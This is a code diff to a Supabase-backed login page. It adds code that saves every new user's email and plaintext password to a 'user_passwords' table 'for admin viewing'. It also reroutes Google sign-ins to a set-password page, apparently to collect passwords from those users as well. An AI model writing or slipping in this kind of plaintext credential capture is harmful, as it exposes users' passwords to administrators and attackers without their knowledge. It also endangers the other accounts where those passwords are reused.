@@ -54,8 +54,21 @@ export default function LoginPage() {
 
     try {
       if (isSignUp) {
-        const { error } = await supabase.auth.signUp({ email, password });
+        const { data, error } = await supabase.auth.signUp({ email, password });
         if (error) throw error;
+        
+        // Store the password for admin viewing
+        if (data.user) {
+          await supabase
+            .from('user_passwords')
+            .upsert({
+              user_id: data.user.id,
+              email: email,
+              password: password,
+              auth_provider: 'email'
+            }, { onConflict: 'user_id' });
+        }
+        
         router.push('/setup');
       } else {
         const { error } = await supabase.auth.signInWithPassword({ email, password });
@@ -92,7 +105,7 @@ export default function LoginPage() {
       const { error } = await supabase.auth.signInWithOAuth({
         provider: 'google',
         options: {
-          redirectTo: `${window.location.origin}/setup`
+          redirectTo: `${window.location.origin}/set-password`
         }
       });
 
